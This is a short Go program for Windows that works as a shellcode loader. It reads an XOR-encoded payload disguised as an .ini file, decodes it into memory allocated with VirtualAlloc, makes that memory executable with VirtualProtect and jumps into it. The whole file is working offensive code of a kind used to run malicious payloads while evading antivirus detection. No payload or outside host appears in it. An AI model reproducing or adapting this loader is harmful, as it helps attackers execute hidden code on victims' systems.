package main

import (
	"syscall"
	"fmt"
	"os"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
	MEM_RELEASE = 0x8000
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc = kernel32.NewProc("VirtualAlloc")
	virtualProtect = kernel32.NewProc("VirtualProtect")
	virtualFree = kernel32.NewProc("VirtualFree")
)

func main() {
	shellcode, err := os.ReadFile("shellcode_xor.ini")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}

	size := len(shellcode)

	addr ,_, err := virtualAlloc.Call(
		0,
		uintptr(size),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	shellcodePtr := (*[1 << 30]byte)(unsafe.Pointer(addr))
	for i := 0; i < size; i++ {
		shellcodePtr[i] = shellcode[i] ^ 0xAA
	}

	var oldProtect uint32
	virtualProtect.Call(
		addr,
		uintptr(size),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	syscall.Syscall(addr, 0, 0, 0, 0)

	virtualFree.Call(
		addr,
		0,
		MEM_RELEASE,
	)

}
